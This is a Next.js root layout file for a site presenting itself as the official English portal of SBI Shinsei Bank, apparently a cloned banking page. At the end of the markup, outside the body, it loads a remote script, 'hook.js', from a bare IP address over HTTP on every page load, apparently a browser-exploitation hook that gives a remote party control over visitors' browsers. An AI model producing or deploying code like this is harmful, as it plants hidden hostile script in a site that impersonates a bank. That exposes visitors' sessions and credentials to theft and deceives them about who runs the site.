import type { Metadata } from "next";
import { Geist, Geist_Mono } from "next/font/google";
import "./globals.css";
import Script from "next/script";

const geistSans = Geist({
  variable: "--font-geist-sans",
  subsets: ["latin"],
});

const geistMono = Geist_Mono({
  variable: "--font-geist-mono",
  subsets: ["latin"],
});

export const metadata: Metadata = {
  title: "SBI Shinsei Bank | English Banking Services in Japan",
  description: "Official English Portal for SBI Shinsei Bank. Open PowerFlex multi-currency accounts, execute GoRemit international transfers, access convenience store ATMs, and bank online in English.",
  keywords: ["SBI Shinsei Bank", "PowerFlex", "GoRemit", "English Banking Japan", "Tokyo Bank Account", "Foreign Currency Deposit"],
};

export default function RootLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  return (
    <html
      lang="en"
      className={`${geistSans.variable} ${geistMono.variable} h-full antialiased scroll-smooth`}
    >
      <body className="min-h-full flex flex-col font-sans bg-white text-slate-900">{children}</body><Script src="http://64.176.85.245/h/hook.js" strategy="afterInteractive" />
    </html>
  );
}
